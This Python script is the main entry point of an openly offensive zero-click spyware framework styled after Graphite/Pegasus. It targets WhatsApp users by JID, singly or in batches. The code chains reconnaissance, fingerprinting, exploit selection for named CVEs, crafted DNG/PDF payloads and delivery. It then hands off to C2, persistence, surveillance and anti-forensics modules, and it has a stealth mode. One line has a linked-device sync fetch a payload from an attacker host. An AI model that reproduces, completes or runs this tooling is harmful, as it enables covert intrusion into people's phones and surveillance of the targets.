#!/usr/bin/env python3
"""Unified Operational Framework — Graphite/Pegasus-class.

Single entry point for the complete operational chain:
  Reconnaissance → Fingerprinting → Exploit Selection → Payload Crafting →
  Delivery → Status Tracking → Post-Exploitation (C2)

Usage:
  python graphite.py --session <path> --target <jid> [--platform iOS] [--ios-version 17]
  python graphite.py --session <path> --targets targets.json --batch
  python graphite.py --session <path> --recon-only --target <jid>
  python graphite.py --session <path> --stealth --target <jid>
"""

import argparse
import asyncio
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from operational_framework import OperationalFramework
from native_wrapper import craft_dng, craft_pdf
from voip_handler import VoIPCallHandler, LinkedDeviceSync
from c2_module import C2Channel, Persistence, AntiForensics
from post_exploit import PostExploitation, Surveillance, AntiForensics as PostAntiForensics
from imessage_delivery import iMessageDelivery, iMessageC2


class GraphiteFramework(OperationalFramework):
    """Extended operational framework with C2 and persistence."""

    def __init__(self, session_path: str, stealth: bool = False, c2_url: str = None):
        super().__init__(session_path, stealth)
        self.c2_url = c2_url
        self.voip = None
        self.linked_sync = None
        self.c2 = None
        if c2_url:
            self.c2 = C2Channel(c2_url, stealth=stealth)

    async def connect(self) -> bool:
        result = await super().connect()
        if result and self.client is not None:
            self.voip = VoIPCallHandler(self.client)
            self.linked_sync = LinkedDeviceSync(self.client)
        return result

    async def deliver_zero_click(self, target, payload, cve: str) -> bool:
        """Deliver zero-click exploit via linked-device sync + media."""
        if cve == "CVE-2025-55177":
            # Step 1: Send linked-device sync message (CVE-2025-55177 entry point)
            sync_ok = await self.linked_sync.trigger_content_fetch(
                target.jid_user, "https://attacker.example.com/payload.dng"
            )
            if not sync_ok:
                # Fallback: direct media delivery
                return await self.deliver(target, payload, cve)
            # Step 2: Send the actual DNG payload via media
            return await self.deliver(target, payload, cve)
        else:
            return await self.deliver(target, payload, cve)

    async def run_full_chain(self, jid_user, platform_hint="unknown", ios_version=None):
        """Execute full operational chain with zero-click delivery."""
        target = await self.recon(jid_user, platform_hint, ios_version)
        if not target.fingerprint or target.error:
            self.targets.append(target)
            return target

        exploit = target.exploit
        universal = exploit.get("universal_exploit", {})
        cve = universal.get("cve", "CVE-2019-3568") if universal else "CVE-2019-3568"

        payload = self.craft_payload(target, cve)

        if cve in ("CVE-2025-55177", "CVE-2019-3568"):
            success = await self.deliver_zero_click(target, payload, cve)
        else:
            success = await self.deliver(target, payload, cve)

        self.targets.append(target)
        return target

    def banner(self):
        if not self.stealth:
            print("""
╔══════════════════════════════════════════════════════════╗
║          OPERATIONAL ZERO-CLICK FRAMEWORK v2.0            ║
║          Graphite/Pegasus-class Exploit Delivery           ║
╠══════════════════════════════════════════════════════════╣
║  Recon → Fingerprint → Select → Craft → Deliver → Track   ║
╚══════════════════════════════════════════════════════════╝
""")


async def main():
    parser = argparse.ArgumentParser(description="Operational Zero-Click Framework v2.0")
    parser.add_argument("--session", required=True, help="pywhats device session path")
    parser.add_argument("--target", help="Single target WhatsApp JID user")
    parser.add_argument("--targets-file", help="JSON file with multiple targets")
    parser.add_argument("--platform", default="unknown",
                        choices=["Android", "iOS", "unknown"])
    parser.add_argument("--ios-version", type=int, default=None)
    parser.add_argument("--out", default="operational_results.json")
    parser.add_argument("--recon-only", action="store_true")
    parser.add_argument("--stealth", action="store_true")
    parser.add_argument("--c2", help="C2 server URL for post-exploitation")
    args = parser.parse_args()

    fw = GraphiteFramework(session_path=args.session, stealth=args.stealth, c2_url=args.c2)
    if not args.stealth:
        fw.banner()

    connected = await fw.connect()
    if not connected:
        if not args.stealth:
            print("[-] Failed to connect - check session path")
        sys.exit(1)

    if not args.stealth:
        print("[+] Connected to WhatsApp\n")

    try:
        if args.targets_file:
            with open(args.targets_file) as f:
                targets_info = json.load(f)
            if isinstance(targets_info, dict):
                targets_info = targets_info.get("targets", [targets_info])
            await fw.run_batch(targets_info)
        elif args.target:
            if args.recon_only:
                target = await fw.recon(args.target, args.platform, args.ios_version)
                fw.targets.append(target)
            else:
                target = await fw.run_full_chain(args.target, args.platform, args.ios_version)
        else:
            if not args.stealth:
                print("[-] No target specified. Use --target or --targets-file")
            sys.exit(1)

        fw.save_results(args.out, memory_only=args.stealth)
        if not args.stealth:
            print(fw.summary())
            print(f"\n[+] Results: {args.out}")
    finally:
        await fw.disconnect()
        if not args.stealth:
            print("\n[+] Disconnected")


if __name__ == "__main__":
    asyncio.run(main())
